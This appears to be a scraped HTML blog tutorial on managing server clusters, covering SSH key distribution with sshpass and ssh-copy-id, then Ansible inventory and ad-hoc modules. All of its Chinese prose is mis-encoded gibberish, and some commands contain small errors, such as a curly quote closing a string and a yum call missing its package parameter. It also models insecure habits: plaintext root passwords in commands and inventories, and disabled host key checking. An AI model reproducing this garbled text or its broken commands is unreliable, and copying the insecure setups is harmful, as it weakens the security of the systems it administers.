<h3 data-id="heading-10">äºŒã€é›†ç¾¤æ‰¹é‡ç®¡ç†-å¯†é’¥è®¤è¯</h3>
<h4 data-id="heading-11">1.æ¦‚è¿°</h4>
<ul>
<li>ä¸¤ä¸ªèŠ‚ç‚¹ï¼Œé€šè¿‡å¯†é’¥å½¢å¼è¿›è¡Œè®¿é—®ï¼Œä¸éœ€è¦è¾“å…¥å¯†ç ã€‚</li>
<li>æœåŠ¡è¦æ±‚ï¼šä¸€äº›æœåŠ¡åœ¨ä½¿ç”¨å‰è¦æ±‚æˆ‘ä»¬åšå¯†é’¥è®¤è¯ã€‚</li>
<li>åå­—ï¼šå¯†é’¥è®¤è¯ï¼Œå…å¯†ç ç™»å½•ï¼ŒåŒå‡»äº’ä¿¡</li>
</ul>
<blockquote>
<p>æ¸©é¦¨æç¤ºï¼šå¯†é’¥è®¤è¯æ˜¯å•å‘çš„ã€‚</p>
</blockquote>
<h4 data-id="heading-12">2.å®æˆ˜åˆ›å»ºåˆ†å‘å¯†é’¥</h4>

















<table><thead><tr><th>è§’è‰²</th><th/></tr></thead><tbody><tr><td>ç®¡ç†æœº</td><td>m01</td></tr><tr><td>è¢«ç®¡ç†èŠ‚ç‚¹</td><td>backupã€nfs01ã€web01</td></tr></tbody></table>
<h5 data-id="heading-13">2.1 åˆ›å»ºå¯†é’¥å¯¹</h5>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment">#åˆ›å»ºæ—¶ä¹Ÿå¯ä»¥ä¸åŠ -t rsa é»˜è®¤å°±æ˜¯rsa</span>
ssh-keygen -t rsa
</code></pre>
<h5 data-id="heading-14">2.2 åˆ†å‘å¯†é’¥</h5>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment">#ç»™backupæœåŠ¡å™¨åˆ†å‘å¯†é’¥ å­˜æ”¾åœ¨è¿œç¨‹ä¸»æœº/root/.ssh/authorized_keys</span>
ssh-copy-id -i /root/.ssh/id_rsa.pub  root@10.0.0.41
</code></pre>
<h5 data-id="heading-15">2.3 è¿æ¥æµ‹è¯•</h5>
<pre><code class="hljs language-bash" lang="bash">ssh root@10.0.0.41 hostname -I

[root@m01 ~]<span class="hljs-comment"># ssh root@10.0.0.41 hostname -I</span>
10.0.0.41 172.16.1.41 
</code></pre>
<h4 data-id="heading-16">3.è‡ªåŠ¨åŒ–åˆ†å‘ä¸åˆ›å»ºå¯†é’¥å¯¹</h4>
<h5 data-id="heading-17">3.1 è‡ªåŠ¨åŒ–åˆ›å»ºå¯†é’¥</h5>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment">#-fæŒ‡å®šè·¯å¾„  -P å¯†ç çŸ­è¯­ï¼Œè®¾ç½®ä¸ºç©º</span>
ssh-keygen -f ~/.ssh/id_rsa -P <span class="hljs-string">''</span>
</code></pre>
<h5 data-id="heading-18">3.2 è‡ªåŠ¨åŒ–åˆ†å‘å…¬é’¥</h5>
<ul>
<li><strong>é˜»ç¢1</strong>ï¼šå¯†ç   <strong>-p</strong> æŒ‡å®šå¯†ç </li>
</ul>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment">#å®‰è£…å¯†ç æä¾›å·¥å…·</span>
yum -y install sshpass
<span class="hljs-comment">#ä½¿ç”¨-p æŒ‡å®šå¯†ç </span>
sshpass -p12366 ssh 10.0.0.41 hostname -I

<span class="hljs-comment">#sshpassä¸ssh-copy-idåˆ†å‘å…¬é’¥</span>
sshpass -p12366 ssh-copy-id 10.0.0.41
</code></pre>
<ul>
<li><strong>é˜»ç¢2</strong>ï¼šç¬¬ä¸€æ¬¡è¿æ¥çš„æ—¶å€™æç¤ºçš„yeså’Œnoï¼Œä¸»æœºå¯†é’¥ä¿¡æ¯æ£€æŸ¥ï¼Œè¾“å…¥yesåå­˜æ”¾åˆ°~/.ssh/known_hosts</li>
</ul>
<blockquote>
<p>æ¸©é¦¨æç¤ºï¼šsshpassä¸ssh-copy-idåˆ†å‘å…¬é’¥ ç¬¬ä¸€æ¬¡è¿æ¥ï¼Œæç¤ºyes/noï¼Œsshpasså°±å¤±æ•ˆäº†ã€‚</p>
<p>è§£å†³æ€è·¯ï¼šä¸´æ—¶å–æ¶ˆå³å¯ï¼Œè¿æ¥çš„æ—¶å€™ä¸æ£€æŸ¥ä¸»æœºä¿¡æ¯ã€‚
-o StrictHostKeyCheckin=no ä¸´æ—¶ä¸æ£€æŸ¥ä¸»æœºä¿¡æ¯.</p>
<p>-p22 æŒ‡å®šä¸»æœºç«¯å£ä¸º22</p>
</blockquote>
<pre><code class="hljs language-sh" lang="sh">sshpass -p12366 ssh-copy-id -i ~/.ssh/id_rsa.pub -oStrictHostKeyChecking=no 10.0.0.31
</code></pre>
<h5 data-id="heading-19">3.3è‡ªåŠ¨åŒ–åˆ›å»ºä¸åˆ†å‘   è„šæœ¬</h5>
<ul>
<li>ç¼–è¾‘   vim /server/scripts/fenfa.sh</li>
</ul>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment">#author:liux</span>
<span class="hljs-comment">#desc:è‡ªåŠ¨è¯åˆ›å»ºå¯†é’¥ä¸åˆ†å‘å¯†é’¥</span>

<span class="hljs-comment">#0.å˜é‡</span>
ips=<span class="hljs-string">"7 31 41"</span>
<span class="hljs-comment">#1.åˆ›å»ºå¯†é’¥å¯¹ï¼ˆæœªæ¥å¯ä»¥åŠ å…¥åˆ¤æ–­ï¼‰</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"åˆ›å»ºå¯†é’¥å¯¹"</span>
ssh-keygen -f /root/.ssh/id_rsa -P <span class="hljs-string">''</span>
<span class="hljs-comment">#2.åˆ†å‘å…¬é’¥</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"åˆ†å‘å…¬é’¥"</span>
<span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> <span class="hljs-variable">$ips</span>
<span class="hljs-keyword">do</span>
   sshpass -p12366 ssh-copy-id -i /root/.ssh/id_rsa.pub  -oStrictHostKeyChecking=no 10.0.0.<span class="hljs-variable">$ip</span>
<span class="hljs-keyword">done</span>

<span class="hljs-comment">#3.æ£€æŸ¥</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"æ£€æŸ¥å¯†é’¥è®¤è¯"</span>
<span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> <span class="hljs-variable">$ips</span>
<span class="hljs-keyword">do</span> 
   ssh 10.0.0.<span class="hljs-variable">$ip</span> hostname -I
<span class="hljs-keyword">done</span>

</code></pre>
<h3 data-id="heading-20">ä¸‰ã€é›†ç¾¤æ‰¹é‡ç®¡ç†-Ansible</h3>
<pre><code class="hljs language-sh" lang="sh">ansible-doc -s	æ¨¡å—å  <span class="hljs-comment">#å‘½ä»¤æŸ¥çœ‹å¸®åŠ©æ–‡æ¡£</span>
<span class="hljs-comment">#å®˜ç½‘æŸ¥çœ‹å¸®åŠ©æ–‡æ¡£</span>
https://docs.ansible.com/ansible/latest/collections/ansible/builtin/index.html<span class="hljs-comment">#plugins-in-ansible-builtin</span>
</code></pre>
<h4 data-id="heading-21">1.Ansibleæ¦‚è¿°</h4>
<blockquote>
<p>Ansibleæ˜¯ä¸€ä¸ªè‡ªåŠ¨åŒ–<strong>ç»Ÿä¸€é…ç½®ç®¡ç†å·¥å…·</strong>ï¼Œè‡ªåŠ¨åŒ–ä¸»è¦ä½“ç°åœ¨Ansibleé›†æˆäº†ä¸°å¯Œæ¨¡å—ä»¥åŠåŠŸèƒ½ç»„ä»¶ï¼Œå¯ä»¥é€šè¿‡ä¸€ä¸ªå‘½ä»¤å®Œæˆä¸€ç³»åˆ—çš„æ“ä½œï¼Œè¿›è€Œèƒ½å‡å°‘é‡å¤æ€§çš„å·¥ä½œå’Œç»´æŠ¤æˆæœ¬ï¼Œå¯ä»¥æé«˜å·¥ä½œæ•ˆç‡</p>
</blockquote>
<ul>
<li>è‡ªåŠ¨åŒ–è¿ç»´ï¼šæ‰¹é‡ç®¡ç†ï¼Œæ‰¹é‡åˆ†å‘ï¼Œæ‰¹é‡æ‰§è¡Œï¼Œç»´æŠ¤......</li>
<li>pythonå†™çš„</li>
<li>ansible è½»é‡çº§ï¼Œå¤§è§„æ¨¡ç¯å¢ƒä¸‹åªé€šè¿‡sshä¼šå¾ˆæ…¢ï¼Œä¸²è¡Œçš„</li>
</ul>





















<table><thead><tr><th>æ‰¹é‡ç®¡ç†å·¥å…·</th><th/></tr></thead><tbody><tr><td>==Ansible==</td><td>æ— å®¢æˆ·ç«¯ï¼ŒåŸºäºsshè¿›è¡Œç®¡ç†ä¸ç»´æŠ¤</td></tr><tr><td>saltstack</td><td>éœ€è¦å®‰è£…å®¢æˆ·ç«¯ï¼ŒåŸºäºsshè¿›è¡Œç®¡ç†</td></tr><tr><td>terraform</td><td>æ‰¹é‡ç®¡ç†åŸºç¡€è®¾æ–½ï¼ˆæ‰¹é‡åˆ›å»º100å°å…¬æœ‰äº‘ï¼‰</td></tr></tbody></table>
<h4 data-id="heading-22">2.Ansibleç®¡ç†æ¶æ„</h4>
<ul>
<li>Inventory ä¸»æœºæ¸…å•ï¼šè¢«ç®¡ç†ä¸»æœºçš„ipåˆ—è¡¨ï¼Œåˆ†ç±»ã€‚</li>
<li>ad-hocæ¨¡å¼ å‘½ä»¤è¡Œæ‰¹é‡ç®¡ç†ï¼ˆä½¿ç”¨ansæ¨¡å—ï¼‰ï¼Œä¸´æ—¶ä»»åŠ¡ã€‚</li>
<li><strong>playbook å‰§æœ¬æ¨¡å¼</strong>ï¼šç±»ä¼¼äºæŠŠæ“ä½œå†™æˆè„šæœ¬ï¼Œå¯ä»¥é‡å¤è¿è¡Œè¯¥è„šæœ¬ã€‚</li>
</ul>
<h4 data-id="heading-23">3.Ansibleå®‰è£…åŠä¿®æ”¹é…ç½®</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment">#1.å®‰è£…epelæº</span>
[root@m01 ~]<span class="hljs-comment"># wget -O /etc/yum.repos.d/epel.repo http://mirrors.aliyun.com/repo/epel-7.repo</span>

<span class="hljs-comment">#2.å®‰è£…Ansible</span>
yum -y install ansible

ansible --version

[root@m01 ~]<span class="hljs-comment"># vim /etc/ansible/ansible.cfg</span>
[root@m01 ~]<span class="hljs-comment"># egrep -vn '^$|#' /etc/ansible/ansible.cfg</span>
10:[defaults]
71:host_key_checking = False
111:log_path = /var/log/ansible.log
327:[inventory]
340:[privilege_escalation]
346:[paramiko_connection]
370:[ssh_connection]
431:[persistent_connection]
445:[accelerate]
460:[selinux]
469:[colors]
485:[diff]
</code></pre>
<h4 data-id="heading-24">4.Ansible-Inventory ä¸»æœºæ¸…å•</h4>
<ul>
<li>
<p>åˆ†ç»„è¿›è¡Œç®¡ç†</p>
</li>
<li>
<p>å­ç»„è¿›è¡Œç®¡ç†</p>
</li>
<li>
<p>é»˜è®¤åœ¨/etc/ansible/hosts</p>
</li>
<li>
<p>åœ¨æŒ‡å®šç›®å½•åˆ›å»ºhostsï¼Œéœ€è¦åœ¨è¿è¡Œansibleå‘½ä»¤çš„æ—¶å€™ï¼Œé€šè¿‡-ié€‰é¡¹æŒ‡å®šhostsæ–‡ä»¶</p>
</li>
</ul>
<h5 data-id="heading-25">4.1 ä¸»æœºæ¸…å•å¿…ä¼šæ ¼å¼</h5>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment">#ç¼–è¾‘hostsæ–‡ä»¶ï¼Œæ·»åŠ éœ€è¦ç®¡ç†çš„æœåŠ¡å™¨ï¼Œå¹¶ç»™æœåŠ¡å™¨åˆ†ç»„</span>
[root@m01 ~]<span class="hljs-comment"># vim /etc/ansible/hosts </span>
[web]
172.16.1.7
[backup]
172.16.1.41
[nfs]
172.16.1.31

<span class="hljs-comment">#invertoryä¸»æœºæ¸…å•å®šä¹‰æ–¹å¼</span>
<span class="hljs-comment">#æ–¹æ³•ä¸€: å•å°ä¸»æœºå®šä¹‰</span>
[root@ansible ~]<span class="hljs-comment"># cat /etc/ansible/hosts </span>
10.0.0.7 ansible_ssh_port=22 ansible_ssh_user=root ansible_ssh_pass=<span class="hljs-string">'1'</span>

<span class="hljs-comment">#æ–¹å¼äºŒã€IP+ç«¯å£+ç”¨æˆ·+å¯†ç </span>
[webs]
10.0.0.7 ansible_ssh_port=22 ansible_ssh_user=root ansible_ssh_pass=<span class="hljs-string">'1'</span>
10.0.0.8 ansible_ssh_port=22 ansible_ssh_user=root ansible_ssh_pass=<span class="hljs-string">'1'</span>

<span class="hljs-comment">#æ–¹å¼ä¸‰ é…ç½®åˆ«åæ–¹</span>
[root@ansible ~]<span class="hljs-comment"># cat /etc/ansible/hosts </span>
[webs]
web01 ansible_ssh_host=10.0.0.7 ansible_ssh_port=22 ansible_ssh_user=root ansible_ssh_pass=<span class="hljs-string">'1'</span>

web02 ansible_ssh_host=10.0.0.8 ansible_ssh_port=22 ansible_ssh_user=root ansible_ssh_pass=<span class="hljs-string">'1'</span>

<span class="hljs-comment">#æ–¹å¼å›› å˜é‡ä½¿ç”¨</span>
[root@ansible ~]<span class="hljs-comment"># cat /etc/ansible/hosts</span>
[webs]
web01 ansible_ssh_host=10.0.0.7 
web02 ansible_ssh_host=10.0.0.8
[webs:vars]
ansible_ssh_port=22 
ansible_ssh_user=root 
ansible_ssh_pass=<span class="hljs-string">'1'</span>
</code></pre>
<ul>
<li>ansibleæµ‹è¯•ä¸‰å°æœåŠ¡å™¨æ˜¯å¦å¯ä»¥pingé€š</li>
</ul>
<pre><code class="hljs language-bash" lang="bash">ansible all -m ping

[root@m01 ~]<span class="hljs-comment"># ansible all -m ping</span>
172.16.1.7 | SUCCESS =&gt; {
    <span class="hljs-string">"ansible_facts"</span>: {
        <span class="hljs-string">"discovered_interpreter_python"</span>: <span class="hljs-string">"/usr/bin/python"</span>
    }, 
    <span class="hljs-string">"changed"</span>: <span class="hljs-literal">false</span>, 
    <span class="hljs-string">"ping"</span>: <span class="hljs-string">"pong"</span>
}
172.16.1.31 | SUCCESS =&gt; {
    <span class="hljs-string">"ansible_facts"</span>: {
        <span class="hljs-string">"discovered_interpreter_python"</span>: <span class="hljs-string">"/usr/bin/python"</span>
    }, 
    <span class="hljs-string">"changed"</span>: <span class="hljs-literal">false</span>, 
    <span class="hljs-string">"ping"</span>: <span class="hljs-string">"pong"</span>
}
172.16.1.41 | SUCCESS =&gt; {
    <span class="hljs-string">"ansible_facts"</span>: {
        <span class="hljs-string">"discovered_interpreter_python"</span>: <span class="hljs-string">"/usr/bin/python"</span>
    }, 
    <span class="hljs-string">"changed"</span>: <span class="hljs-literal">false</span>, 
    <span class="hljs-string">"ping"</span>: <span class="hljs-string">"pong"</span>
}

</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/82d6d6341e374807a5872c5f6471f0db~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbGl1eDM1Mjg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768877500&amp;x-signature=UO3QhLF4IWL6Up%2BrZ%2FZTlwGhAqc%3D" alt="image-20230327221008704" loading="lazy"/></p>
<blockquote>
<p>ä¸»æœºæ¸…å•åˆ†ç»„è¯¦è§£ï¼š</p>
<p>â€‹    	éœ€è¦æˆ‘ä»¬è¿›è¡Œåˆ†ç»„ï¼šæŒ‰ç…§å±‚æ¬¡è¿›è¡Œåˆ†ç»„ï¼ŒæŒ‰ç…§åŠŸèƒ½/ä¸šåŠ¡è¿›è¡Œåˆ†ç»„</p>
</blockquote>
<h5 data-id="heading-26">4.2 å­ç»„ï¼ˆç»™ç»„å†åˆ†ç»„ï¼‰</h5>
<pre><code class="hljs language-csharp" lang="csharp">[<span class="hljs-meta">data:children</span>]
backup
nfs
</code></pre>
<h5 data-id="heading-27">4.3å°ç»“</h5>
<ul>
<li>å¸®åŠ©æ–‡æ¡£</li>
</ul>
<blockquote>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.ansible.com%2F" target="_blank" title="https://docs.ansible.com/" ref="nofollow noopener noreferrer">Ansible Documentation</a></p>
</blockquote>
<h4 data-id="heading-28">5.Ansibleå¿…çŸ¥å¿…ä¼šæ¨¡å—-ad-hoc</h4>
<ul>
<li>ansibleæ¨¡å— modules</li>
<li>ansibleé€šè¿‡å„ç§æ¨¡å—å®ç°æ‰¹é‡ç®¡ç†</li>
<li>ä¸€èˆ¬æ¥è¯´è¿™äº›æ¨¡å—å¯¹åº”ç€Linuxé‡Œé¢çš„åŸºæœ¬æ“ä½œæˆ–æœåŠ¡ç®¡ç†</li>
<li>æ‰¾å‡ºLinuxåœºæ™¯æ“ä½œå¯¹åº”çš„æ¨¡å—å³å¯ã€‚</li>
</ul>









































































<table><thead><tr><th>æ¨¡å—åˆ†ç±»</th><th/></tr></thead><tbody><tr><td><strong>å‘½ä»¤å’Œè„šæœ¬æ¨¡å—</strong></td><td><strong>commandæ¨¡å— é»˜è®¤çš„æ¨¡å—ï¼Œæ‰§è¡Œç®€å•å‘½ä»¤ï¼Œä¸æ”¯æŒç‰¹æ®Šç¬¦å·</strong></td></tr><tr><td/><td><strong>shellæ¨¡å— æ‰§è¡Œå‘½ä»¤ï¼Œæ”¯æŒç‰¹æ®Šç¬¦å·</strong></td></tr><tr><td/><td><strong>scriptæ¨¡å—  åˆ†å‘è„šæœ¬å¹¶æ‰§è¡Œ</strong></td></tr><tr><td><strong>æ–‡ä»¶</strong></td><td><strong>file åˆ›å»ºç›®å½•ï¼Œæ–‡ä»¶ï¼Œè½¯é“¾æ¥</strong></td></tr><tr><td/><td><strong>copy è¿œç¨‹åˆ†å‘æ–‡ä»¶ï¼Œä¿®æ”¹æƒé™ï¼Œæ‰€æœ‰è€…ï¼Œå¤‡ä»½</strong></td></tr><tr><td>æœåŠ¡</td><td><strong>systemdæœåŠ¡ç®¡ç†</strong></td></tr><tr><td/><td>service æœåŠ¡ç®¡ç†ï¼ˆäº†è§£ï¼‰</td></tr><tr><td>è½¯ä»¶åŒ…</td><td>yumæº  yum_repository</td></tr><tr><td/><td><strong>yum å‘½ä»¤</strong></td></tr><tr><td/><td>get_urlä¸‹è½½è½¯ä»¶</td></tr><tr><td>ç³»ç»Ÿç®¡ç†</td><td>mount æŒ‚è½½</td></tr><tr><td/><td>cron å®šæ—¶ä»»åŠ¡</td></tr><tr><td>ç”¨æˆ·ç®¡ç†</td><td>user ç®¡ç†ç”¨æˆ·</td></tr><tr><td/><td>group ç®¡ç†ç”¨æˆ·ç»„</td></tr><tr><td>è°ƒå¼æ¨¡å—</td><td>ping æ¨¡å—æ£€æŸ¥ ansibleä¸å…¶ä»–èŠ‚ç‚¹è¿é€šæ€§</td></tr><tr><td/><td>debug ç”¨äºæ£€æŸ¥/æ˜¾ç¤º å˜é‡</td></tr></tbody></table>





























<table><thead><tr><th>ansible</th><th/><th/><th/></tr></thead><tbody><tr><td>ansible</td><td>ä¸»æœºæ¸…å•ï¼ˆall/web/172.16.1.7ï¼‰</td><td>-m æ¨¡å—</td><td>-a æ¨¡å—ä¸­çš„é€‰é¡¹</td></tr><tr><td>-m æŒ‡å®šæ¨¡å—</td><td/><td/><td/></tr><tr><td>-a æŒ‡å®šæ¨¡å—ä¸­çš„é€‰é¡¹</td><td/><td/><td/></tr></tbody></table>
<h5 data-id="heading-29">5.1å‘½ä»¤ä¸è„šæœ¬ç±»æ¨¡å—</h5>
<h6 data-id="heading-30">aï¼‰commandæ¨¡å—</h6>
<ul>
<li>
<p>ans é»˜è®¤çš„æ¨¡å—ï¼Œé€‚ç”¨äºæ‰§è¡Œç®€å•çš„å‘½ä»¤ï¼Œä¸æ”¯æŒç‰¹æ®Šç¬¦å·ï¼ˆ -m command å¯ä»¥ä¸åŠ ï¼‰</p>
</li>
<li>
<p>æ‰¹é‡è·å–æ‰€æœ‰ä¸»æœºçš„ä¸»æœºå</p>
</li>
</ul>
<pre><code class="hljs language-bash" lang="bash"> ansible all -m <span class="hljs-built_in">command</span> -a <span class="hljs-string">'hostname'</span>
 ansible all  -a <span class="hljs-string">'ip a s eth0'</span>
</code></pre>
<h6 data-id="heading-31">bï¼‰shellæ¨¡å—</h6>
<ul>
<li>ä¸commandæ¨¡å—ç›¸ä¼¼ï¼Œä½†æ”¯æŒç‰¹æ®Šç¬¦å·</li>
<li>æ‰¹é‡è·å–ipåœ°å€</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">ansible all -m shell -a <span class="hljs-string">"ip a s eth0 |awk -F '[ /]+' 'NR==3{print \$3}'"</span>
</code></pre>
<blockquote>
<p>æ¸©é¦¨æç¤ºï¼š</p>
<p>shellæ¨¡å—ä¸æ¨èè¾ƒä¸ºå¤æ‚çš„æŒ‡ä»¤ï¼Œå¦‚æœéœ€è¦æ‰§è¡Œå¯æ”¾åœ¨è„šæœ¬ä¸­æ‰§è¡Œã€‚</p>
</blockquote>
<h6 data-id="heading-32">cï¼‰scriptæ¨¡å—</h6>
<ul>
<li>
<p>åˆ†å‘è„šæœ¬ï¼ˆä¼ è¾“è„šæœ¬ï¼‰</p>
</li>
<li>
<p>è¿è¡Œè„šæœ¬</p>
</li>
<li>
<p>æ‰¹é‡æ‰§è¡Œè„šæœ¬è·å–ä¸»æœºä¿¡æ¯</p>
</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">[root@m01 ~]<span class="hljs-comment"># vim /server/scripts/ansible.sh</span>
<span class="hljs-comment">#!/bin/bash</span>
<span class="hljs-comment">#author :liux</span>
<span class="hljs-comment">#desc:ç³»ç»Ÿå·¡æ£€è„šæœ¬</span>

hostname
hostname -I
<span class="hljs-built_in">uptime</span>
<span class="hljs-built_in">whoami</span>
<span class="hljs-built_in">date</span> +%F


ansible all -m script -a <span class="hljs-string">'/server/scripts/ansible.sh'</span>
</code></pre>
<h5 data-id="heading-33">5.2 æ–‡ä»¶ç›¸å…³æ¨¡å—</h5>
<h6 data-id="heading-34">aï¼‰fileæ¨¡å—</h6>
<ul>
<li>ç®¡ç†æ–‡ä»¶ï¼Œç®¡ç†ç›®å½•ï¼Œåˆ›å»ºè½¯é“¾æ¥</li>
<li>æŸ¥çœ‹å¸®åŠ©æ–‡æ¡£ansible-doc -s file</li>
</ul>





































<table><thead><tr><th>fileæ¨¡å—</th><th/></tr></thead><tbody><tr><td>==path==</td><td>è·¯å¾„ï¼ˆç›®å½•ã€æ–‡ä»¶ï¼‰ï¼Œå¿…é¡»è¦å†™</td></tr><tr><td>src</td><td>æºæ–‡ä»¶ä¸€èˆ¬ç”¨äºlinkï¼ˆåˆ›å»ºè½¯é“¾æ¥æ¨¡å¼ï¼‰ ç”¨äºæŒ‡å®šæºæ–‡ä»¶</td></tr><tr><td>==state==</td><td>çŠ¶æ€ï¼ˆæ¨¡å¼ï¼‰<br/>state=directory   åˆ›å»ºç›®å½•<br/>state=fileï¼ˆé»˜è®¤ï¼‰ æ›´æ–°æ–‡ä»¶ï¼Œå¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ä¹Ÿä¸åˆ›å»º<br/>state=link åˆ›å»ºè½¯é“¾æ¥<br/>state=touch åˆ›å»ºæ–‡ä»¶<br/>state=absent åˆ é™¤ï¼ˆ:warning:æ³¨æ„ï¼šå¦‚æœæ˜¯ç›®å½•ï¼Œå°†é€’å½’åˆ é™¤ç›®å½•ï¼‰</td></tr><tr><td/><td/></tr><tr><td>mode</td><td>mode=755 åˆ›å»ºå¹¶ä¿®æ”¹æƒé™</td></tr><tr><td>owner</td><td>owner=root</td></tr><tr><td>group</td><td>group=root</td></tr></tbody></table>
<ul>
<li>åˆ›å»ºæ–‡ä»¶</li>
</ul>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment">#åˆ›å»º</span>
ansible all -m file -a <span class="hljs-string">'path=/opt/liux.txt state=touch'</span>
<span class="hljs-comment">#æŸ¥çœ‹</span>
ansible all -a <span class="hljs-string">'ls -l /opt/liux.txt'</span>
</code></pre>
<ul>
<li>åˆ›å»ºç›®å½•</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">ansible all -m file  -a <span class="hljs-string">'path=/app/ state=directory'</span>
</code></pre>
<ul>
<li>åˆ›å»ºè½¯é“¾æ¥  /etc/hostsåˆ›å»ºè½¯é“¾æ¥åˆ°/optä¸‹</li>
</ul>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-built_in">ln</span> -s /etc/hosts  /opt/hosts
ansible all -m file -a <span class="hljs-string">'src=/etc/hosts path=/opt/hosts state=link'</span>
</code></pre>
<ul>
<li>åˆ›å»º/ans-backup ç›®å½• æ‰€æœ‰è€…æ˜¯liux</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">ansible all -m file  -a <span class="hljs-string">'path=/app/ owner=liux group=liux mode=700 state=directory'</span>
</code></pre>
<ul>
<li>åˆ é™¤</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">ansible all -m file  -a <span class="hljs-string">'path=/app/ state=absentâ€™
</span></code></pre>
<h6 data-id="heading-35">bï¼‰copyæ¨¡å—</h6>
<ul>
<li>æ‰¹é‡åˆ†å‘ï¼šscp</li>
</ul>

































<table><thead><tr><th>copyæ¨¡å—</th><th/></tr></thead><tbody><tr><td>==src==</td><td>source æºæ–‡ä»¶</td></tr><tr><td>==dest==</td><td>destination ç›®æ ‡æ–‡ä»¶</td></tr><tr><td>backup</td><td>backup=yes åˆ™ä¼šåœ¨è¦†ç›–å‰å¤‡ä»½</td></tr><tr><td>mode</td><td>mode=755 åˆ›å»ºå¹¶ä¿®æ”¹æƒé™</td></tr><tr><td>owner</td><td>owner=root</td></tr><tr><td>group</td><td>group=root</td></tr></tbody></table>
<pre><code class="hljs language-sh" lang="sh">ansible all -m copy -a <span class="hljs-string">'src=/etc/hosts dest=/etc/hosts backup=yes'</span>
</code></pre>
<h6 data-id="heading-36">cï¼‰lineinfile</h6>
<ul>
<li>ä¿®æ”¹æ–‡ä»¶å†…å®¹</li>
</ul>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment">#æŸ¥çœ‹å¸®åŠ©æ–‡æ¡£</span>
ansible-doc -s lineinfile
</code></pre>
<h5 data-id="heading-37">5.3æœåŠ¡ç®¡ç†-sysmtemd</h5>
<ul>
<li>ç›¸å½“äºæ˜¯sysmtemctlå‘½ä»¤ï¼š
<ul>
<li>å¼€å¯/å…³é—­/é‡å¯æœåŠ¡</li>
<li>å¼€æœºè‡ªå¯åŠ¨</li>
</ul>
</li>
</ul>

























<table><thead><tr><th>systemdæ¨¡å—</th><th/></tr></thead><tbody><tr><td>name</td><td>ç”¨äºæŒ‡å®šæœåŠ¡åç§°</td></tr><tr><td>enabled</td><td>yeså¼€å¯è‡ªå¯åŠ¨</td></tr><tr><td>state</td><td>è¡¨ç¤ºæœåŠ¡å¼€ã€å…³ã€é‡å¯<br/>state=started å¼€å¯<br/>state=stopped å…³é—­<br/>state=reloaded é‡è¯»é…ç½®æ–‡ä»¶ï¼ˆæœåŠ¡æ”¯æŒï¼‰<br/>state=restarted é‡å¯ï¼ˆå…³é—­å†å¼€å¯ï¼‰</td></tr><tr><td>daemon-reload</td><td>yes æ˜¯å¦é‡æ–°åŠ è½½å¯¹åº”çš„æœåŠ¡ç®¡ç†é…ç½®æ–‡ä»¶ï¼ˆç”¨äºä¹¦å†™systemctlé…ç½®æ–‡ä»¶ï¼‰</td></tr></tbody></table>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment">#å¯åŠ¨æœåŠ¡</span>
ansible all -m systemd -a <span class="hljs-string">'name=crond enabled=yes state=started'</span>

<span class="hljs-comment">#å…³é—­æœåŠ¡</span>
ansible all -m systemd -a <span class="hljs-string">'name=firewalld enabled=no state=stopped'</span>

<span class="hljs-comment">#é‡å¯sshæœåŠ¡</span>
ansible all -m systemd -a <span class="hljs-string">'name=sshd state=reloaded '</span>
</code></pre>
<h5 data-id="heading-38">5.3 è½¯ä»¶ç®¡ç†</h5>
<ul>
<li>yumæ¨¡å—</li>
<li>get_urlæ¨¡å—</li>
<li>yum_repositoryæ¨¡å—  yumæºé…ç½®æ¨¡å—</li>
</ul>
<h6 data-id="heading-39">aï¼‰yumæ¨¡å—</h6>





















<table><thead><tr><th>yumå‘½ä»¤</th><th/></tr></thead><tbody><tr><td>name</td><td>æŒ‡å®šè½¯ä»¶åŒ…åå­—</td></tr><tr><td>state</td><td>installed å®‰è£…ï¼ˆpresentï¼‰é»˜è®¤<br/>removed åˆ é™¤ ï¼ˆabsentï¼‰<br/>lastest å®‰è£…æˆ–æ›´æ–°</td></tr><tr><td>update_cache</td><td>å¯ä»¥è®¾ç½®ä¸ºnoåŠ åŠ é€Ÿ</td></tr></tbody></table>
<pre><code class="hljs language-sh" lang="sh">ansible all -m yum -a <span class="hljs-string">'tree,htop update_cache=no'</span>
</code></pre>
<h6 data-id="heading-40">bï¼‰get_urlæ¨¡å—</h6>
<ul>
<li>wgetå‘½ä»¤  æ‰€æœ‰ä¸»æœºèƒ½è®¿é—®ç½‘ç»œæ‰è¡Œ</li>
<li>æ¨èåœ¨ç®¡ç†èŠ‚ç‚¹ä¸‹è½½å¥½ï¼Œä½¿ç”¨copyåˆ†å‘å³å¯ã€‚</li>
</ul>





















<table><thead><tr><th>get_urlæ¨¡å—</th><th/></tr></thead><tbody><tr><td>url</td><td>æŒ‡å®šä¸‹è½½çš„åœ°å€</td></tr><tr><td>dest</td><td>ä¸‹è½½åˆ°å“ªä¸ªç›®å½•</td></tr><tr><td/><td/></tr></tbody></table>
